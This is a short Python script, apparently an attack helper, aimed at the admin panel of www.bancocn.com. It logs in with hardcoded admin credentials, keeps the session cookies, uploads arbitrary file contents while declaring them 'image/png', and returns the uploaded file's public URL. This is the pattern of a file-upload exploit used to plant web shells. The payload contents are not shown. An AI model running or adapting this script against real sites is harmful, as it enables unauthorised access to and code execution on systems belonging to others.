from utils import randomString
from requests import post, get
from hpparser import findCode

class Context:
    def __init__(self) -> None:
        self.token = randomString(24)
        self.LOGIN_PAYLOAD = 'user=admin&password=senhafoda'

        self.cookies = None

    def authenticate(self):
        authResponse = get("http://www.bancocn.com/admin/login.php")
        self.cookies = authResponse.cookies
        post('http://www.bancocn.com/admin/index.php', data=self.LOGIN_PAYLOAD, allow_redirects=True, cookies=self.cookies, headers={
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
         
    # Returns the show url
    def upload(self, title: str, fileName: str, contents, category: int = 1) -> str:
        files = {
            'image': (fileName, contents, "image/png"),
        }

        it = post('http://www.bancocn.com/admin/index.php', files=files, data={
            'category': category,
            'Add': 'Add',
            'title':  title
            }, cookies=self.cookies)
        assert it.status_code == 200
        return findCode(it.text, title).replace('..', 'http://www.bancocn.com/')
